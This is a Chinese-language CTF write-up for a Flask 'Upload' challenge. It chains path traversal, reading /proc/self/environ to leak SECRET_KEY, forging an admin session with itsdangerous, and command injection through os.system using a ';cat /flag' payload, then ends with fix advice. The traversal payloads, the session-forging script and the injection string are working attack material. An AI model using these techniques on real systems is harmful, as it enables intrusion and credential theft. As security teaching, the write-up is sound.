# Upload

## 题目简述

应用允许任意非 `admin` 用户直接登录并上传图片。`/upload?file_path=...` 把参数拼到 `./uploads/` 后打开，形成目录穿越和任意文件读取；管理员分支又把同一个路径拼入 `os.system()`，形成命令注入。完整利用链为：普通用户任意文件读取得到源码和密钥，伪造管理员 Session 或恢复管理员密码，触发命令执行，再用普通用户会话读取命令输出。

## 解题过程

### 普通用户任意文件读取

登录逻辑只对用户名 `admin` 检查密码，其他用户名都直接写入 Session：

```python
if username == "admin":
    if hashlib.sha256(password.encode()).hexdigest() == ADMIN_HASH:
        session["username"] = username
else:
    session["username"] = username
```

因此可用任意普通用户名登录。GET `/upload` 时，非管理员分支执行：

```python
file_path = "./uploads/" + request.args.get("file_path")
with open(file_path, "rb") as f:
    content = f.read()
return f'<img src="data:image/png;base64,{base64.b64encode(content).decode()}">'
```

参数没有规范化或目录边界检查。请求：

```text
/upload?file_path=../../../../proc/self/cmdline
```

响应虽然伪装成 PNG Data URI，Base64 解码后却是进程命令行，可据此确认应用入口为 `/app/app.py`。随后读取：

```text
/upload?file_path=../../../../app/app.py
```

即可得到完整 Flask 源码。提取响应的通用代码为：

```python
import base64
import re

match = re.search(r"base64,([^\"]+)", response.text)
content = base64.b64decode(match.group(1))
```

### 取得管理员身份

有两种路线。

第一种是继续读取 `/proc/self/environ`。源码显示：

```python
app.secret_key = os.getenv("SECRET_KEY")
```

所以环境内容中的 `SECRET_KEY=...\x00` 就是 Flask 客户端 Session 的签名密钥。取得它后可签发 `{"username":"admin"}`：

```python
import hashlib
from flask.sessions import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer

serializer = URLSafeTimedSerializer(
    secret_key,
    salt="cookie-session",
    serializer=TaggedJSONSerializer(),
    signer_kwargs={
        "key_derivation": "hmac",
        "digest_method": hashlib.sha1,
    },
)
admin_session = serializer.dumps({"username": "admin"})
```

第二种是识别源码中的 SHA-256：

```text
32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0
```

它对应题目弱口令 `backdoor`，可直接正常登录。第一条路线更能体现漏洞链，也不依赖外部哈希库；第二条路线适合作为交叉验证。

### 管理员分支命令注入

管理员查看文件时，应用没有打开文件，而是把用户参数放入 shell：

```python
os.system(f"base64 {file_path} > /tmp/{file_path}.b64")
```

其中 `file_path` 仍由 `"./uploads/" + request.args["file_path"]` 得到。以管理员会话请求下面的参数即可插入命令：

```text
;cat /flag > ./uploads/output #
```

拼接后的 shell 命令前半部分变为：

```bash
base64 ./uploads/; cat /flag > ./uploads/output # ...
```

井号会注释后续由第二次 `file_path` 插值产生的残余内容。通过 `requests.get(..., params={"file_path": payload})` 提交可自动把 `#` 编码为 `%23`；若手工把未编码井号放进 URL，它会被浏览器当作片段标识，不会发送到服务器。

管理员分支固定返回拒绝文本，但命令输出已写入 `./uploads/output`。再使用普通用户 Session 请求：

```text
/upload?file_path=output
```

普通分支会读取该文件并放入 Base64 Data URI，解码即可取得 flag。分离管理员和普通用户两个 Session，是因为管理员分支本身不会返回文件内容。

## 方法总结

本题的漏洞并非孤立存在：目录穿越先泄露源码与 `SECRET_KEY`，伪造 Session 后才能触达管理员命令注入，最后又复用普通用户的任意文件读取作为回显通道。修复时应使用 `Path.resolve()` 后验证目标仍位于上传根目录，Session 密钥不能放在可由同一进程文件读取得到的位置，任何用户路径都不得进入 `os.system()`；如需 Base64 编码，应直接调用 Python 的 `base64` 模块处理已验证的文件对象。
